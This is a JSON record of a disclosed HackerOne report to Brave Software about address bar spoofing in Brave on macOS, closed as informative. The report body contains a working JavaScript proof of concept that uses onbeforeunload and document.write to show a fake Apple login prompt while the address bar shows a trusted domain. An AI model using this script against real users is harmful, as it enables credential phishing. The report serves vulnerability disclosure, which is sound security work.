@@ -1,0 +1,126 @@
+{
+  "id": 208834,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDg4MzQ=",
+  "url": "https://hackerone.com/reports/208834",
+  "title": "Address bar spoofing in Brave browser via. window close warnings",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "medium",
+  "readable_substate": "Informative",
+  "created_at": "2017-02-25T08:54:01.874Z",
+  "submitted_at": "2017-02-25T08:54:01.874Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": true,
+    "username": "xifengweiyu",
+    "url": "/xifengweiyu",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15688,
+    "url": "https://hackerone.com/brave",
+    "handle": "brave",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Brave Software",
+      "twitter_handle": "brave",
+      "website": "https://brave.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-08-10T05:09:22.500Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-04-29T02:17:48.322Z",
+  "team_member_agreed_on_going_public_at": "2017-08-10T05:09:22.461Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello,\nI would like to Report Address Bar spoofing vulnerability in Brave Browser on macOS.\n\n## Summary:\n\nWhen people visit the poc page,I notice them to type a DNS record exist but cannot access domain \"access.apple.com\" to address bar.then window will popup a close warnings,then phishing is beginning...\n\n\n## Products affected: \n\n**macOS Sierra version:** 10.12.3\n\n**Brave version:**\n\nBrave: 0.13.4 \nrev: 71d8ffc7278a90b22b8617d37880787c1781e694 \nMuon: 2.56.4 \nlibchromiumcontent: 56.0.2924.87 \nV8: 5.6.326.50 \nNode.js: 7.4.0 \nUpdate Channel: dev \nos.platform: darwin \nos.release: 16.4.0 \nos.arch: x64\n\n\n## Steps To Reproduce:\n\n 1.POC script is:\n\n```\n<h1 id=\"msg\">Next,type access.apple.com in the address bar.</h1>\n<h1 id=\"spoof\"></h1>\n<script type=\"text/javascript\">\nspoof.style.display = 'none';\nvar done = 0;\nvar got = 0;\nonbeforeunload = function(ev) {\n  done = 1;\n  return false;\n}\nonmousemove = function() {\n  stop();\n  if (done && !got) {\n    msg.style.display = 'none';\n    got = \"1000\";\n    if (got) {\n      document.write(\"<title>apple login</title><h1>This is not apple.com!!!</h1><scri\"+\"pt>onbeforeunload=function(){/*while(1){}*/};document.write('<input id=\\\\\\'log\\\\\\'>');window.stop();prompt('enter your apple account...');window.stop();location.assign('https://access.apple.com');</scrip\"+\"t>\");\n      spoof.style.display = 'block';\n      log.value = got;\n      \n    }\n  }\n}\n</script>\n```\n\n2. Or you can visit online poc page,then following page instruction:\n\n[https://api.lightrains.org/poc/17.html](https://api.lightrains.org/poc/17.html)\n\nBest regards!\n",
+  "weakness": {
+    "id": 57,
+    "name": "Violation of Secure Design Principles"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 163618,
+      "file_name": "brave1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/163/618/865ab9df5c25ccb312789126e943c60cb3dc0e57/brave1.png?response-content-disposition=attachment%3B%20filename%3D%22brave1.png%22%3B%20filename%2A%3DUTF-8%27%27brave1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYQUYVEFJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T210739Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBzKlhXwZKf2%2Fo%2BKlcXYLg6NhmHVb%2F4tHGSC%2BoS7ES9iAiEA8M9A8ASz9J1GE9hga6jx48unjpQ6N3PkQhlm7UNebtUqsgUIHRADGgwwMTM2MTkyNzQ4NDkiDAt0FWwTbQpj4AgE7yqPBTTIGlq%2F0YUtukQ5HHLvm8KtnQ%2B6mz9mBIANo73Mw99zjcob1kZR%2BxAascIlVnPzBwsGLj1dRIyouzQSDO8AXSoxxEzot1SPAFne%2B6B2waIt1gpF9wJPWGdIhImWu2k5G9Tg%2FdBkekVZ6GSxJHOnz8g8GQbv%2B3VNmYzLFtQOW88sGw%2BGKrc83%2Bv3j07PhTEIlMWhR6gQHIARIRDwC0GG%2Bb3cXy5%2BJelF1hGVTx4HMJ3KQfFk6ipFtvOqVHpmzvMTR2Anf9%2BVNQhUioF38WXsuLTh8XSLqAeNd51chgrolBEb0%2BtKQOURpSntqTHWL5GnrOsv%2Bf5O1n9gIl1pRDisMTf25jG8P9EX8lYhnlDYTRx8L8gglaN2VUFXWX0QVhPR5ENiAVaodC%2FFccfuvAXT1%2BaI70pIE4zd%2BNMQRVi8Y0dY%2F%2BYTIKjpZHMZNJM%2Fhfhi2VwgQMhjYGFNqKuBTBKIUu%2B6yLTGRq3fKhzkwhq2%2BhKebuiwGIcFMJKakAt89ct94Mrulvg2AZ7w7foqLQj4fSQcr9pLXpBVjwSqxxYhHYaxnpGAnSn108FRqTbAYSogB20P5LPVH9xFgE%2BWXhq8ScfPEFeER%2FN3ezXqPQTNL5Zg68hCwlJReVW386ys%2BGW3Qmd9lYtD99jDdorFN6Y3HwLFoosuom1OusjV4LVdlzVMt7xtMS%2BrN7YaVKZ6DtPPUwbjPYuf9v38pliJ3AnwBC0OhllviRRUvByALZHwp%2FeuLzEh0Dl%2BWplTXzZM6IiiGOgq7%2BAbs%2B4Ygs6IdjwQi4yd4yb%2FfqYT8fcRd5pHiRU8IIRxm4%2Fww08YWY7gFSKwotZ0uaZEOuAFmeaqsL9O0FXDndy73E%2FCs1R%2FwIEqP9Iw0afBxgY6sQFdDmqhpmU1p9pOLgozIBD02OgsMI9pV6JX3vcboowFeSIXEfWqM%2FW3%2BSVqOXxmCO5aKjsUEN06Feyoq6irsgHHj6xRAp6dutBo4EsQWflMY0T3Kz8PJ%2F9aRSDLSuuTTGjDzEg98ItYaqc7FcqWlmwWWFXYWGAI8GIJ7VyqUSXqANxBZULS3ld6wX5tZ07DHSOcHIZq8BkmsnrGYNBqMYilHXRm17Dm%2BybCYgOAeKxxwnA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e579d681799a6f0d19b9030a396ad97a6bf9aa7a3d8625dce13782a5edd54f21",
+      "file_size": 194205,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 163619,
+      "file_name": "brave2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/163/619/aa7aaeeca85b1894462c5a7ced7ec33bfa7fc76d/brave2.png?response-content-disposition=attachment%3B%20filename%3D%22brave2.png%22%3B%20filename%2A%3DUTF-8%27%27brave2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYQUYVEFJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T210739Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBzKlhXwZKf2%2Fo%2BKlcXYLg6NhmHVb%2F4tHGSC%2BoS7ES9iAiEA8M9A8ASz9J1GE9hga6jx48unjpQ6N3PkQhlm7UNebtUqsgUIHRADGgwwMTM2MTkyNzQ4NDkiDAt0FWwTbQpj4AgE7yqPBTTIGlq%2F0YUtukQ5HHLvm8KtnQ%2B6mz9mBIANo73Mw99zjcob1kZR%2BxAascIlVnPzBwsGLj1dRIyouzQSDO8AXSoxxEzot1SPAFne%2B6B2waIt1gpF9wJPWGdIhImWu2k5G9Tg%2FdBkekVZ6GSxJHOnz8g8GQbv%2B3VNmYzLFtQOW88sGw%2BGKrc83%2Bv3j07PhTEIlMWhR6gQHIARIRDwC0GG%2Bb3cXy5%2BJelF1hGVTx4HMJ3KQfFk6ipFtvOqVHpmzvMTR2Anf9%2BVNQhUioF38WXsuLTh8XSLqAeNd51chgrolBEb0%2BtKQOURpSntqTHWL5GnrOsv%2Bf5O1n9gIl1pRDisMTf25jG8P9EX8lYhnlDYTRx8L8gglaN2VUFXWX0QVhPR5ENiAVaodC%2FFccfuvAXT1%2BaI70pIE4zd%2BNMQRVi8Y0dY%2F%2BYTIKjpZHMZNJM%2Fhfhi2VwgQMhjYGFNqKuBTBKIUu%2B6yLTGRq3fKhzkwhq2%2BhKebuiwGIcFMJKakAt89ct94Mrulvg2AZ7w7foqLQj4fSQcr9pLXpBVjwSqxxYhHYaxnpGAnSn108FRqTbAYSogB20P5LPVH9xFgE%2BWXhq8ScfPEFeER%2FN3ezXqPQTNL5Zg68hCwlJReVW386ys%2BGW3Qmd9lYtD99jDdorFN6Y3HwLFoosuom1OusjV4LVdlzVMt7xtMS%2BrN7YaVKZ6DtPPUwbjPYuf9v38pliJ3AnwBC0OhllviRRUvByALZHwp%2FeuLzEh0Dl%2BWplTXzZM6IiiGOgq7%2BAbs%2B4Ygs6IdjwQi4yd4yb%2FfqYT8fcRd5pHiRU8IIRxm4%2Fww08YWY7gFSKwotZ0uaZEOuAFmeaqsL9O0FXDndy73E%2FCs1R%2FwIEqP9Iw0afBxgY6sQFdDmqhpmU1p9pOLgozIBD02OgsMI9pV6JX3vcboowFeSIXEfWqM%2FW3%2BSVqOXxmCO5aKjsUEN06Feyoq6irsgHHj6xRAp6dutBo4EsQWflMY0T3Kz8PJ%2F9aRSDLSuuTTGjDzEg98ItYaqc7FcqWlmwWWFXYWGAI8GIJ7VyqUSXqANxBZULS3ld6wX5tZ07DHSOcHIZq8BkmsnrGYNBqMYilHXRm17Dm%2BybCYgOAeKxxwnA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=538a52ae77f561f043b5c27abaa0b6d10798f7acfcbdf0235a9d47f02370e066",
+      "file_size": 129360,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 5,
+  "voters": [
+    "skansing",
+    "khizer47",
+    "cyberbot_nageshwaran",
+    "pwnipc",
+    "cometstreamn"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
